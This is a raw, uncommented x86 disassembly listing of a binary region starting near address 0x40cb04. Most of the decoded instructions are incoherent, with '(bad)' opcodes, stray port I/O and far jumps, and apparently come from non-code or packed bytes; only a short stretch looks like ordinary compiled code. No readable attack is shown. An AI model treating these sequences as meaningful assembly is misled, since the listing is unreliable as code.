  40cb04:	cmp    ah,cl
  40cb06:	call   0x7429e23c
  40cb0b:	mov    esp,0xff421087
  40cb10:	test   BYTE PTR [ecx],ch
  40cb12:	sbb    ecx,ecx
  40cb14:	or     eax,0xdc62b670
  40cb19:	mov    edx,0x32e21c8c
  40cb1e:	mov    dl,0x5f
  40cb20:	jb     0x40cb17
  40cb22:	sbb    esp,ebp
  40cb24:	mov    edx,0x21eea47
  40cb29:	or     eax,0xd4561298
  40cb2e:	int    0xd1
  40cb30:	in     al,dx
  40cb31:	dec    ebp
  40cb32:	out    0xc9,al
  40cb34:	jecxz  0x40cafc
  40cb36:	jmp    0x5997:0x39a2fdca
  40cb3d:	int3   
  40cb3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb3f:	xor    al,0x4d
  40cb41:	mov    DWORD PTR [edi],esi
  40cb43:	sbb    al,BYTE PTR [eax+edi*8-0x80]
  40cb47:	mov    ebp,DWORD PTR [ecx-0x7fa03ac8]
  40cb4d:	sbb    ch,BYTE PTR [ebx]
  40cb4f:	sti    
  40cb50:	rcr    DWORD PTR [ebp-0x3a],cl
  40cb53:	pushf  
  40cb54:	or     al,BYTE PTR [ebx-0x4994d4dd]
  40cb5a:	call   0xdc21:0x8a4f94dc
  40cb61:	pop    es
  40cb62:	inc    edi
  40cb63:	mov    ecx,0x4c6b4188
  40cb68:	and    al,0x8f
  40cb6a:	call   0x5400e6b3
  40cb6f:	push   esi
  40cb70:	out    dx,eax
  40cb71:	pop    esp
  40cb72:	push   0x6d401ae4
  40cb77:	or     ebx,DWORD PTR [esi+0x2c5d3acf]
  40cb7d:	retf   0x879c
  40cb80:	push   cs
  40cb81:	rcl    edx,cl
  40cb83:	jmp    FWORD PTR [ebp-0x24]
  40cb86:	mov    ebp,0x44ed8648
  40cb8b:	fstp   DWORD PTR [edi+eax*4-0xa9f570c]
  40cb92:	sahf   
  40cb93:	dec    eax
  40cb94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb95:	outs   dx,BYTE PTR ds:[esi]
  40cb96:	xor    dh,BYTE PTR [esi-0x42211503]
  40cb9c:	ins    BYTE PTR es:[edi],dx
  40cb9d:	pop    ss
  40cb9e:	scas   al,BYTE PTR es:[edi]
  40cb9f:	xchg   ecx,eax
  40cba0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cba1:	jns    0x40cbc4
  40cba3:	add    DWORD PTR [ecx-0x1633b6cf],esi
  40cba9:	mov    eax,0x9bdf3e60
  40cbae:	loop   0x40cc22
  40cbb0:	test   al,0x6c
  40cbb2:	pop    ecx
  40cbb3:	or     eax,0x4e113fb6
  40cbb8:	sahf   
  40cbb9:	inc    edi
  40cbba:	pop    ebx
  40cbbb:	jbe    0x40cbd1
  40cbbd:	inc    eax
  40cbbe:	push   ds
  40cbbf:	mov    esp,0x6e33566b
  40cbc4:	xchg   ebx,eax
  40cbc5:	fistp  DWORD PTR [ecx-0x16dead42]
  40cbcb:	xor    al,0xb8
  40cbcd:	pop    es
  40cbce:	call   0x4eeb9d04
  40cbd3:	enter  0x21c6,0xbb
  40cbd7:	lock and edi,DWORD PTR [esi+0x7ca840c6]
  40cbde:	or     edi,esp
  40cbe0:	mov    ah,0xd2
  40cbe2:	dec    ecx
  40cbe3:	mov    cl,0xc
  40cbe5:	inc    eax
  40cbe6:	in     al,dx
  40cbe7:	cmp    al,0xdc
  40cbe9:	mov    ah,0x98
  40cbeb:	in     al,0xa7
  40cbed:	adc    eax,0x9293c5a4
  40cbf2:	lahf   
  40cbf3:	add    ah,0x9c
  40cbf6:	jbe    0x40cc35
  40cbf8:	(bad)  [edi-0x24]
  40cbfb:	mov    al,0x8c
  40cbfd:	out    dx,eax
  40cbfe:	add    bh,dh
  40cc00:	sbb    DWORD PTR [ebp-0x6bbbe6a5],edx
  40cc06:	mov    ebp,0x942f228f
  40cc0b:	test   DWORD PTR [ecx-0x3e4f1e8a],esi
  40cc11:	push   edi
  40cc12:	cmp    BYTE PTR [edi+0x592ab1b],ah
  40cc18:	xor    al,BYTE PTR [ebx+0x49]
  40cc1b:	xor    esi,DWORD PTR [ebp+0x2d93c51]
  40cc21:	rcr    BYTE PTR [ebp-0x65],cl
  40cc24:	push   esp
  40cc25:	scas   eax,DWORD PTR es:[edi]
  40cc26:	fwait
  40cc27:	mov    dl,0x3f
  40cc29:	sbb    al,0x3c
  40cc2b:	or     cl,ah
  40cc2d:	addr16 mov ss,esp
  40cc30:	dec    ebp
  40cc31:	retf   
  40cc32:	retf   
  40cc33:	ja     0x40cca6
  40cc35:	lods   eax,DWORD PTR ds:[esi]
  40cc36:	lahf   
  40cc37:	mov    ebx,0x44ba39e0
  40cc3c:	pop    edi
  40cc3d:	and    BYTE PTR [ebx+ebx*4],ah
  40cc40:	out    dx,eax
  40cc41:	pop    es
  40cc42:	mov    al,ds:0x31ef995c
  40cc47:	adc    esi,DWORD PTR ds:0x66dc3868
  40cc4d:	xor    bl,BYTE PTR [ebx-0x34]
  40cc50:	sub    ah,BYTE PTR [ebp-0x5663a697]
  40cc56:	pop    esp
  40cc57:	dec    esp
  40cc58:	add    edi,DWORD PTR [ecx-0x44]
  40cc5b:	push   ss
  40cc5c:	or     cl,bh
  40cc5e:	inc    esp
  40cc5f:	pop    ebx
  40cc60:	xchg   ecx,eax
  40cc61:	add    eax,0x3537a8fb
  40cc66:	mov    ebp,0xc0e0df9d
  40cc6b:	mov    al,ds:0x7ab5813d
  40cc70:	repnz mov dh,0x54
  40cc73:	je     0x40cc3b
  40cc75:	dec    esi
  40cc76:	mov    cl,0x1e
  40cc78:	ins    BYTE PTR es:[edi],dx
  40cc79:	inc    esp
  40cc7a:	mov    ah,0x2
  40cc7c:	jle    0x40cc50
  40cc7e:	dec    esp
  40cc7f:	sbb    edx,ebp
  40cc81:	sahf   
  40cc82:	pop    ebx
  40cc83:	std    
  40cc84:	adc    edi,DWORD PTR [ecx+edi*4-0x4d]
  40cc88:	pop    es
  40cc89:	pushf  
  40cc8a:	mov    al,0x35
  40cc8c:	mov    ecx,0x36c7ab50
  40cc91:	mov    cl,0x5c
  40cc93:	add    BYTE PTR [ebp+ecx*4-0xe],al
  40cc97:	dec    edi
  40cc98:	xchg   esp,eax
  40cc99:	cmc    
  40cc9a:	add    eax,0xcb90506e
  40cc9f:	mov    bl,0xab
  40cca1:	sbb    eax,0xb5ab42a
  40cca6:	xchg   esp,eax
  40cca7:	int    0x97
  40cca9:	jmp    0x6104:0xa4cfafb3
  40ccb0:	jmp    0x9665:0xba181f20
  40ccb7:	pop    ebx
  40ccb8:	je     0x40cd1e
  40ccba:	dec    ebp
  40ccbb:	adc    edx,DWORD PTR [ebx]
  40ccbd:	sub    al,0x8c
  40ccbf:	gs jns 0x40ccdf
  40ccc2:	inc    eax
  40ccc3:	dec    esi
  40ccc4:	or     al,0xc0
  40ccc6:	fwait
  40ccc7:	mov    ebp,0x388227e8
  40cccc:	xor    eax,0xb42547c3
  40ccd1:	mov    eax,ds:0xbeac63c0
  40ccd6:	mov    esp,0xb3b3b7
  40ccdb:	inc    ebx
  40ccdc:	(bad)  
  40ccdd:	fadd   QWORD PTR [esi]
  40ccdf:	cmp    eax,0xdfba9ec7
  40cce4:	push   0xf05cf24e
  40cce9:	add    al,0xf5
  40cceb:	adc    eax,0x7c441443
  40ccf0:	outs   dx,BYTE PTR ds:[esi]
  40ccf1:	adc    bh,dh
  40ccf3:	test   al,0x7b
  40ccf5:	imul   edx,DWORD PTR [edi-0x76],0xa9dd8f8
  40ccfc:	dec    esp
  40ccfd:	jbe    0x40cd79
  40ccff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd00:	out    0x9c,al
  40cd02:	test   eax,0x2885817d
  40cd07:	out    dx,eax
  40cd08:	cmp    eax,0x468cb2b
  40cd0d:	jno    0x40cce1
  40cd0f:	inc    sp
  40cd11:	pop    es
  40cd12:	cwde   
  40cd13:	xor    al,0x14
  40cd15:	shl    ebp,1
  40cd17:	xor    edi,DWORD PTR [esp-0x63]
  40cd1b:	xchg   DWORD PTR cs:[ecx],edi
  40cd1e:	icebp  
  40cd1f:	mov    bl,0x68
  40cd21:	(bad)  
  40cd22:	xchg   ecx,eax
  40cd23:	pop    edi
  40cd24:	lods   eax,DWORD PTR ds:[esi]
  40cd25:	cli    
  40cd26:	das    
  40cd27:	lea    eax,[edx+0x55fb172]
  40cd2d:	neg    BYTE PTR [edi-0x5ad5e5fb]
  40cd33:	test   al,dh
  40cd35:	xor    BYTE PTR [ebp-0x12],al
  40cd38:	xlat   BYTE PTR ds:[ebx]
  40cd39:	cmp    cl,BYTE PTR [ebx]
  40cd3b:	mov    dh,0xa7
  40cd3d:	and    BYTE PTR [esi],al
  40cd3f:	fild   WORD PTR [esi+0x583c978]
  40cd45:	in     al,0xae
  40cd47:	xor    eax,0x70939bb1
  40cd4c:	imul   ebp,DWORD PTR [edi],0xfe4ae903
  40cd52:	mov    cl,0xbc
  40cd54:	mov    bh,0xff
  40cd56:	or     DWORD PTR [eax+0x251b5944],edx
  40cd5c:	and    eax,0x5d7b62cd
  40cd61:	(bad)  
  40cd62:	cmp    BYTE PTR [ebp-0x18],ch
  40cd65:	not    DWORD PTR [edi]
  40cd67:	xchg   ecx,eax
  40cd68:	sbb    DWORD PTR [ebx-0xa],edx
  40cd6b:	popa   
  40cd6c:	imul   esp,edx,0x20dc3de5
  40cd72:	mov    cl,0xe
  40cd74:	cmp    eax,0xa732d8d8
  40cd79:	jno    0x40cd8f
  40cd7b:	popa   
  40cd7c:	jb     0x40cdf7
  40cd7e:	or     al,0xff
  40cd80:	mov    eax,ds:0x36d90ede
  40cd85:	mov    cl,0x1
  40cd87:	sti    
  40cd88:	(bad)  
  40cd89:	jecxz  0x40cd32
  40cd8b:	sbb    edx,ebp
  40cd8d:	xchg   edi,eax
  40cd8e:	in     eax,0xd2
  40cd90:	xchg   edx,eax
  40cd91:	jg     0x40cd6f
  40cd93:	sbb    DWORD PTR [eax],ebx
  40cd95:	stos   BYTE PTR es:[edi],al
  40cd96:	lods   al,BYTE PTR ds:[esi]
  40cd97:	sub    ebp,DWORD PTR [eax]
  40cd99:	les    cx,DWORD PTR [ebx+0x5c]
  40cd9d:	test   DWORD PTR [esi],edi
  40cd9f:	pop    es
  40cda0:	add    dl,BYTE PTR ds:0x6264ef22
  40cda6:	into   
  40cda7:	ds pop edx
  40cda9:	pusha  
  40cdaa:	xchg   BYTE PTR [esi+0x11],cl
  40cdad:	mov    ds,eax
  40cdaf:	mov    ch,0xef
  40cdb1:	pop    ds
  40cdb2:	add    al,0xcc
  40cdb4:	mov    esp,0x74eea39b
  40cdb9:	fistp  QWORD PTR [esi+0x5364f509]
  40cdbf:	arpl   WORD PTR [edx],dx
  40cdc1:	lea    esp,ds:0x6e6f3380
  40cdc7:	sar    dl,1
  40cdc9:	cwde   
  40cdca:	out    dx,al
  40cdcb:	xor    al,bh
  40cdcd:	lods   eax,DWORD PTR ds:[esi]
  40cdce:	ss dec eax
  40cdd0:	pop    edx
  40cdd1:	test   DWORD PTR [ebx-0x4a8171d2],0xf9b7fcfc
  40cddb:	cdq    
  40cddc:	push   0x76
  40cdde:	jnp    0x40ce0c
  40cde0:	pop    es
  40cde1:	xor    cl,BYTE PTR [eax]
  40cde3:	mov    DWORD PTR [edx-0x6],eax
  40cde6:	inc    edx
  40cde7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cde8:	ret    0xecfb
  40cdeb:	cmp    eax,0xd7b5840f
  40cdf0:	sbb    eax,0x75640dff
  40cdf5:	iret   
  40cdf6:	push   esp
  40cdf7:	mov    bh,0x93
  40cdf9:	xor    eax,0xe3a7aaf4
  40cdfe:	pop    ebp
  40cdff:	js     0x40cdb8
  40ce01:	mov    es,WORD PTR gs:[ebp+0x72]
  40ce05:	aaa    
  40ce06:	ret    0x150b
  40ce09:	test   DWORD PTR [ecx-0x7f],ebp
  40ce0c:	fadd   DWORD PTR [edi]
  40ce0e:	jge    0x40cd9b
  40ce10:	ret    
  40ce11:	stos   DWORD PTR es:[edi],eax
  40ce12:	jg     0x40cdbc
  40ce14:	jmp    0x40ce20
  40ce16:	adc    eax,0x1f6fee8
  40ce1b:	xchg   edi,eax
  40ce1c:	mov    edi,0xe492966b
  40ce21:	hlt    
  40ce22:	pop    edx
  40ce23:	or     esi,DWORD PTR [edx+0x7f]
  40ce26:	rcl    dl,0x11
  40ce29:	stos   BYTE PTR es:[edi],al
  40ce2a:	jae    0x40ce27
  40ce2c:	hlt    
  40ce2d:	ret    
  40ce2e:	push   ebx
  40ce2f:	push   esi
  40ce30:	mov    dl,0x4a
  40ce32:	inc    edx
  40ce33:	mov    eax,ds:0xbe06c857
  40ce38:	mov    fs,WORD PTR [esi+eax*4+0x1e]
  40ce3c:	shr    esi,cl
  40ce3e:	or     ecx,DWORD PTR [ecx+0x2a]
  40ce41:	int3   
  40ce42:	mov    cl,0xbc
  40ce44:	xor    ebx,ebx
  40ce46:	fdivr  DWORD PTR [esi]
  40ce48:	push   ecx
  40ce49:	(bad)  
  40ce4a:	out    dx,al
  40ce4b:	sbb    DWORD PTR [esi+eax*4-0x19],0xfc4489e3
  40ce53:	lea    esp,[edi]
  40ce55:	adc    eax,0x9106af6e
  40ce5a:	sbb    DWORD PTR [edx],ebp
  40ce5c:	or     edi,ebp
  40ce5e:	fimul  DWORD PTR [edi+edx*8+0x3e]
  40ce62:	cmp    BYTE PTR [eax+eiz*8-0x73],ch
  40ce66:	scas   eax,DWORD PTR es:[edi]
  40ce67:	jle    0x40ce28
  40ce69:	sbb    eax,0x75bf1536
  40ce6e:	pop    ds
  40ce6f:	aas    
  40ce70:	or     DWORD PTR [ebx+edi*4],esp
  40ce73:	and    ch,ah
  40ce75:	cmp    eax,0x47f018e4
  40ce7a:	popf   
  40ce7b:	das    
  40ce7c:	or     bl,BYTE PTR ds:0x85539128
  40ce82:	xchg   ebp,eax
  40ce83:	not    BYTE PTR [eax-0x7bb7d31d]
  40ce89:	loopne 0x40ceb0
  40ce8b:	std    
  40ce8c:	pop    edi
  40ce8d:	xchg   cl,dl
  40ce8f:	test   ax,0xa5c8
  40ce93:	arpl   WORD PTR [edi-0x2e],dx
  40ce96:	nop
  40ce97:	push   0x44
  40ce99:	dec    esp
  40ce9a:	ds pop esi
  40ce9c:	cmp    bl,bl
  40ce9e:	ja     0x40ce59
  40cea0:	int3   
  40cea1:	add    DWORD PTR [ecx],ebx
  40cea3:	mov    ds:0x971e9b16,eax
  40cea8:	cmp    BYTE PTR [esi+0x2c],bh
  40ceab:	imul   edx,DWORD PTR [ecx],0xffffffdc
  40ceae:	mov    ah,BYTE PTR [eax-0x20d13edc]
  40ceb4:	adc    ebp,DWORD PTR [edx]
  40ceb6:	mov    esi,0xf592758d
  40cebb:	sahf   
  40cebc:	div    bh
  40cebe:	sub    ebp,DWORD PTR [edx]
  40cec0:	jns    0x40cf0e
  40cec2:	dec    eax
  40cec3:	or     BYTE PTR [esi+eiz*1],0xfb
  40cec7:	push   ecx
  40cec8:	jae    0x40ceb3
  40ceca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cecb:	ja     0x40cebd
  40cecd:	aam    0x3e
  40cecf:	ror    bl,cl
  40ced1:	aad    0x87
  40ced3:	pop    edx
  40ced4:	fs ja  0x40cf03
  40ced7:	stos   DWORD PTR es:[edi],eax
  40ced8:	xchg   ecx,eax
  40ced9:	repnz xchg edi,eax
  40cedb:	dec    edx
  40cedc:	xchg   esi,eax
  40cedd:	dec    esi
  40cede:	push   edi
  40cedf:	push   ds
  40cee0:	sub    al,0x7
  40cee2:	cdq    
  40cee3:	das    
  40cee4:	sub    al,0x27
  40cee6:	hlt    
  40cee7:	out    0x21,eax
  40cee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ceea:	fbld   TBYTE PTR [esi-0x59c0b310]
  40cef0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cef1:	pop    edi
  40cef2:	and    eax,0x30d35afe
  40cef7:	mov    bl,0x4
  40cef9:	dec    ecx
  40cefa:	test   DWORD PTR [ebx+0x47257db1],ebp
  40cf00:	pop    esp
  40cf01:	jb     0x40cf53
  40cf03:	enter  0x52b8,0x82
  40cf07:	push   esp
  40cf08:	xchg   ebx,eax
  40cf09:	daa    
  40cf0a:	repz fwait
  40cf0c:	pop    esi
  40cf0d:	fsubr  DWORD PTR [edx+0x7c]
  40cf10:	pop    ebp
  40cf11:	sbb    eax,0xf2d822e3
  40cf16:	inc    ebp
  40cf17:	fs (bad) 
  40cf19:	and    eax,0x5aaf35e1
  40cf1e:	lds    ebp,FWORD PTR [ecx-0x2670ca85]
  40cf24:	pop    es
  40cf25:	int3   
  40cf26:	ret    
  40cf27:	inc    eax
  40cf28:	cmp    BYTE PTR [esi+edx*1-0x2885c695],0x7c
  40cf30:	fcom   DWORD PTR [eax+0xd]
  40cf34:	loope  0x40cfa1
  40cf36:	cli    
  40cf37:	push   edi
  40cf38:	jns    0x40cf81
  40cf3a:	jmp    0x40cfaa
  40cf3c:	mov    cl,0xc1
  40cf3e:	or     edi,eax
  40cf40:	mov    ah,0x9
  40cf42:	inc    ebx
  40cf43:	call   0x5c0:0x2bb6b17a
  40cf4a:	sbb    al,0xb7
  40cf4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf4d:	sub    esp,DWORD PTR [ebx]
  40cf4f:	xchg   ebp,eax
  40cf50:	mov    fs,ecx
  40cf52:	loope  0x40cf58
  40cf54:	enter  0xc8fa,0xe
  40cf58:	sahf   
  40cf59:	enter  0xadab,0xbd
  40cf5d:	xor    eax,0xd882e732
  40cf62:	or     BYTE PTR ss:[edi+0x67e55619],bh
  40cf69:	popa   
  40cf6a:	cmp    dl,dl
  40cf6c:	push   ss
  40cf6d:	xchg   bl,ah
  40cf6f:	popa   
  40cf70:	inc    ebp
  40cf71:	pop    ds
  40cf72:	loope  0x40cf88
  40cf74:	push   esp
  40cf75:	sbb    esp,DWORD PTR [ecx]
  40cf77:	(bad)  
  40cf78:	sub    al,0x52
  40cf7a:	add    edx,ecx
  40cf7c:	xor    edx,ebx
  40cf7e:	mov    ebx,DWORD PTR ds:0x434014
  40cf84:	or     DWORD PTR ds:0x436018,ebx
  40cf8a:	mov    DWORD PTR [ebp-0x50],edx
  40cf8d:	mov    edx,DWORD PTR [ebp+0x8]
  40cf90:	mov    ebx,DWORD PTR ds:0x434020
  40cf96:	sbb    DWORD PTR ds:0x43401c,ebx
  40cf9c:	mov    ebx,DWORD PTR [ebp-0x4c]
  40cf9f:	jmp    0x40f353
  40cfa4:	mov    DWORD PTR [edi+0x2c],0x73f3ac7a
  40cfab:	ret    
  40cfac:	xchg   esp,eax
  40cfad:	cs or  al,0xd2
  40cfb0:	jno    0x40d01c
  40cfb2:	leave  
  40cfb3:	mov    ebp,0x7c7ce265
  40cfb8:	jmp    0x40d019
  40cfba:	jl     0x40d038
  40cfbc:	pop    esp
  40cfbd:	mov    esi,0xf16c4775
  40cfc2:	adc    DWORD PTR [eax-0x53],esp
  40cfc5:	fbstp  TBYTE PTR [esi-0x4076a597]
  40cfcb:	nop
  40cfcc:	or     ch,BYTE PTR [ecx+0x496a5c17]
  40cfd2:	into   
  40cfd3:	leave  
  40cfd4:	cmp    BYTE PTR [ebp+eiz*2+0x324b98aa],dl
  40cfdb:	xchg   cl,bh
  40cfdd:	rol    BYTE PTR [edx+0x3e],1
  40cfe0:	mov    ch,0xb4
  40cfe2:	lahf   
  40cfe3:	or     eax,0xab39899d
  40cfe8:	ins    BYTE PTR es:[edi],dx
  40cfe9:	push   esi
  40cfea:	push   edi
  40cfeb:	std    
  40cfec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfed:	pop    es
  40cfee:	mov    bl,0x9f
  40cff0:	or     al,0xda
  40cff2:	outs   dx,DWORD PTR ds:[esi]
  40cff3:	jnp    0x40d04f
  40cff5:	(bad)  
  40cff6:	ret    0x8d95
  40cff9:	mov    ebx,DWORD PTR [si]
  40cffc:	sub    eax,DWORD PTR ds:0x2a3c0bb
  40d002:	xchg   esp,eax
  40d003:	dec    ebx
  40d004:	pusha  
  40d005:	or     dl,BYTE PTR [ebp+ebp*2-0x33374ffd]
  40d00c:	dec    ebp
  40d00d:	ins    BYTE PTR es:[edi],dx
  40d00e:	cmp    DWORD PTR [edx-0x3a],edi
  40d011:	mov    ah,0xa0
  40d013:	sub    eax,0xaf333ac9
  40d018:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d019:	push   ss
  40d01a:	inc    ecx
  40d01b:	gs mov esi,0x79c42e79
  40d021:	jecxz  0x40d030
  40d023:	sbb    ecx,DWORD PTR [ecx-0x55]
  40d026:	fisttp WORD PTR [ebp+0x1a]
  40d029:	popa   
  40d02a:	sar    BYTE PTR [ecx],cl
  40d02c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d02d:	inc    eax
  40d02e:	inc    esp
  40d02f:	lods   eax,DWORD PTR ds:[esi]
  40d030:	popa   
  40d031:	inc    eax
  40d032:	(bad)  
  40d034:	lods   eax,DWORD PTR ds:[esi]
  40d035:	addr16 xchg edi,eax
  40d037:	gs test eax,0x87aeb175
  40d03d:	push   DWORD PTR [esi-0x6adf4969]
  40d043:	call   FWORD PTR [eax-0xc8c4819]
  40d049:	in     al,0x2
  40d04b:	jbe    0x40d0c2
  40d04d:	fwait
  40d04e:	js     0x40d024
  40d050:	retf   0x60eb
  40d053:	mov    ch,0xf8
  40d055:	xor    BYTE PTR [esi+eax*4],bl
  40d058:	sub    eax,0x89bca897
  40d05d:	in     eax,0x4f
  40d05f:	jbe    0x40d054
  40d061:	out    0xa,eax
  40d063:	lahf   
  40d064:	loopne 0x40d01a
  40d066:	loope  0x40d0b8
  40d068:	push   edi
  40d069:	ret    0xc739
  40d06c:	ja     0x40d06f
  40d06e:	stc    
  40d06f:	and    dl,BYTE PTR [ebx+0x7d5494d4]
  40d075:	xor    al,0x5b
  40d077:	inc    esp
  40d078:	jnp    0x40d0b8
  40d07a:	push   0xca915801
  40d07f:	clc    
  40d080:	jns    0x40d0fa
  40d082:	dec    eax
  40d083:	loop   0x40d054
  40d085:	add    eax,0xf76e0815
  40d08a:	js     0x40d0ad
  40d08c:	jmp    0x40d0a8
  40d08e:	xchg   edx,edi
  40d090:	adc    al,0x48
  40d092:	sub    eax,0x437845e3
  40d097:	repz inc eax
  40d099:	xor    ecx,DWORD PTR [edx+0x18bc1e6f]
  40d09f:	xchg   dl,bh
  40d0a1:	mov    eax,ds:0xb4ae0222
  40d0a6:	sahf   
  40d0a7:	jp     0x40d0cf
  40d0a9:	push   ebx
  40d0aa:	mov    al,ds:0x7d671617
  40d0af:	aas    
  40d0b0:	push   edx
  40d0b1:	mov    ebx,0x6b90a177
  40d0b6:	xchg   edx,eax
  40d0b7:	lahf   
  40d0b8:	push   ds
  40d0b9:	(bad)  
  40d0ba:	adc    cl,dh
  40d0bc:	jno    0x40d113
  40d0be:	jl     0x40d07f
  40d0c0:	inc    eax
  40d0c1:	pop    esi
  40d0c2:	sub    DWORD PTR [ebp+ebp*2-0x70],edi
  40d0c6:	mov    bl,0x12
  40d0c8:	sbb    ebx,esi
  40d0ca:	sub    ebp,ebp
  40d0cc:	jle    0x40d13d
  40d0ce:	fstp   st(7)
  40d0d0:	loop   0x40d14b
  40d0d2:	xor    edx,DWORD PTR [ebp+0x5]
  40d0d5:	adc    al,0xd4
  40d0d7:	stos   DWORD PTR es:[edi],eax
  40d0d8:	cmc    
  40d0d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0da:	mov    edx,0x24ec9a6e
  40d0df:	add    BYTE PTR [edx+edx*8],dh
  40d0e2:	pushf  
  40d0e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0e4:	fst    QWORD PTR [eax-0x7b]
  40d0e7:	retf   0x8b58
  40d0ea:	ret    
  40d0eb:	pop    ebp
  40d0ec:	add    DWORD PTR [eax+0xf02ddf1],0xca7f8627
  40d0f6:	hlt    
  40d0f7:	mov    bh,0x87
  40d0f9:	xlat   BYTE PTR ds:[ebx]
  40d0fa:	dec    ecx
  40d0fb:	lods   eax,DWORD PTR ds:[esi]
  40d0fc:	xor    edi,DWORD PTR [ecx+0x26]
  40d0ff:	pushf  
  40d100:	add    cl,ch
  40d102:	push   ebx
  40d103:	jle    0x40d15c
  40d105:	adc    DWORD PTR [edi+edi*8+0x31],edi
  40d109:	jnp    0x40d156
  40d10b:	js     0x40d153
  40d10d:	(bad)  
  40d10e:	pop    ds
  40d10f:	sahf   
  40d110:	sbb    al,0xb3
  40d112:	sbb    eax,0x2b9d669f
  40d117:	cwde   
  40d118:	xor    DWORD PTR [eax+0x49a76e44],ebx
  40d11e:	adc    esp,edx
  40d120:	push   ecx
  40d121:	cmp    ebp,DWORD PTR [ebx+ebx*4+0x38]
  40d125:	fsubr  st(3),st
  40d127:	xor    bl,ch
  40d129:	loop   0x40d0e5
  40d12b:	jecxz  0x40d137
  40d12d:	icebp  
  40d12e:	jbe    0x40d0c4
  40d130:	mov    dh,0x50
  40d132:	jmp    0x40d0e0
  40d134:	xchg   esp,eax
  40d135:	pop    ecx
  40d136:	add    DWORD PTR [ebp-0x7176606d],esp
  40d13c:	sub    al,BYTE PTR [ebp+edi*1-0x4b]
  40d140:	sti    
  40d141:	test   DWORD PTR [edx+edx*4-0x2],ebx
  40d145:	ficomp WORD PTR [eax]
  40d147:	jae    0x40d125
  40d149:	push   es
  40d14a:	jb     0x40d140
  40d14c:	mov    DWORD PTR [eax+0xe],eax
  40d14f:	sbb    al,0x99
  40d151:	cld    
  40d152:	ins    BYTE PTR es:[edi],dx
  40d153:	imul   ebp,DWORD PTR [eax],0x63
  40d156:	loop   0x40d1d6
  40d158:	(bad)  
  40d159:	jecxz  0x40d1c6
  40d15b:	sub    dh,bl
  40d15d:	rol    BYTE PTR [eax-0x50],0xa8
  40d161:	cld    
  40d162:	stos   DWORD PTR es:[edi],eax
  40d163:	in     al,dx
  40d164:	push   edx
  40d165:	push   ebx
  40d166:	pushf  
  40d167:	or     al,0x3d
  40d169:	cmp    bl,BYTE PTR [esi-0x40]
  40d16c:	sub    eax,0x4eab1158
  40d171:	pop    ebx
  40d172:	shufps xmm7,XMMWORD PTR [ecx],0x8a
  40d176:	mov    edi,0x962f13ec
  40d17b:	inc    ebx
  40d17c:	push   ecx
  40d17d:	push   0x56fdb409
  40d182:	push   0x4b0ca946
  40d187:	adc    DWORD PTR [ecx+0x34],esp
  40d18a:	mov    al,al
  40d18c:	adc    eax,0xbf591c2f
  40d191:	add    eax,0x9347802a
  40d196:	push   ss
  40d197:	adc    al,0xa6
  40d199:	sbb    BYTE PTR [edx],ah
  40d19b:	retf   0x647a
  40d19e:	push   esi
  40d19f:	pop    edx
  40d1a0:	xor    BYTE PTR [edx],ah
  40d1a2:	ret    0xce2b
  40d1a5:	cmp    edi,ebx
  40d1a7:	imul   esi,DWORD PTR [ebx+0x4b748ac8],0x3f
  40d1ae:	xor    al,BYTE PTR ds:0x4c2ec46e
  40d1b4:	mov    al,0xef
  40d1b6:	sahf   
  40d1b7:	xchg   ecx,ecx
  40d1b9:	and    al,0x3
  40d1bb:	cmp    ah,BYTE PTR [eax+0x49]
  40d1be:	fisttp WORD PTR ds:0x5226cff
  40d1c4:	push   es
  40d1c5:	(bad)  
  40d1c6:	stos   DWORD PTR es:[edi],eax
  40d1c7:	rcl    dh,0x9d
  40d1ca:	push   ebp
  40d1cb:	push   ss
  40d1cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1cd:	ins    BYTE PTR es:[edi],dx
  40d1ce:	jmp    0xdcd52670
  40d1d3:	or     al,0xac
  40d1d5:	scas   al,BYTE PTR es:[edi]
  40d1d6:	cmovle ecx,esp
  40d1d9:	push   ss
  40d1da:	mov    ds:0xcd5d9641,al
  40d1df:	dec    ebp
  40d1e0:	call   0x872c1e1e
  40d1e5:	and    bl,BYTE PTR [edx-0x5e]
  40d1e8:	test   DWORD PTR [esi],eax
  40d1ea:	jbe    0x40d242
  40d1ec:	jns    0x40d26a
  40d1ee:	retf   0x3a40
  40d1f1:	addr16 jmp 0x8565:0x233f678c
  40d1f9:	aam    0xe6
  40d1fb:	mov    eax,0xb7cfc8f8
  40d200:	mov    ebx,0xbeecb519
  40d205:	sub    ecx,eax
  40d207:	xchg   bh,al
  40d209:	mov    ebx,0xd1b3f7be
  40d20e:	adc    eax,0x46c14458
  40d213:	push   eax
  40d214:	push   eax
  40d215:	mov    eax,0x644dbe16
  40d21a:	jmp    0xb0b5c2e9
  40d21f:	xor    dh,bh
  40d221:	aaa    
  40d222:	cli    
  40d223:	pop    esi
  40d224:	test   eax,0xdeaa63d5
  40d229:	dec    esp
  40d22a:	aad    0xc9
  40d22c:	sbb    BYTE PTR [ecx],al
  40d22e:	sbb    dl,ch
  40d230:	out    0xb4,al
  40d232:	sbb    al,0x9c
  40d234:	jnp    0x40d264
  40d236:	mov    WORD PTR [ecx-0x6],ss
  40d239:	outs   dx,DWORD PTR ds:[esi]
  40d23a:	adc    DWORD PTR [edx-0x694e11a8],ecx
  40d240:	ja     0x40d263
  40d242:	push   ebx
  40d243:	shl    BYTE PTR [ebx+0x1c],cl
  40d246:	jle    0x40d26e
  40d248:	bound  edi,QWORD PTR [esi-0x15d1b70]
  40d24e:	xchg   ebx,eax
  40d24f:	mov    esp,0xde4457dd
  40d254:	push   ds
  40d255:	int    0xab
  40d257:	dec    ebx
  40d258:	jl     0x40d212
